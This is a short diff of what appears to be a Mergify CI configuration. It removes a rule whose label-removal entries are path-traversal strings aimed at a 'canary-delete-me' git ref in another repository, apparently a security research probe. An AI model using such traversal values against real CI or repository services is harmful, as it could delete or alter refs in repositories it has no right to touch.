@@ -1,11 +1,1 @@
-pull_request_rules:
-  - name: label-remove-traversal
-    conditions:
-      - base=main
-      - label=fire-label
-    actions:
-      label:
-        remove:
-          - "../../../../../kirasec-research1/ci-confidential-30019349/git/refs/heads/canary-delete-me"
-          - "../../../../kirasec-research1/ci-confidential-30019349/git/refs/heads/canary-delete-me"
-          - "../../../kirasec-research1/ci-confidential-30019349/git/refs/heads/canary-delete-me"
+pull_request_rules: []
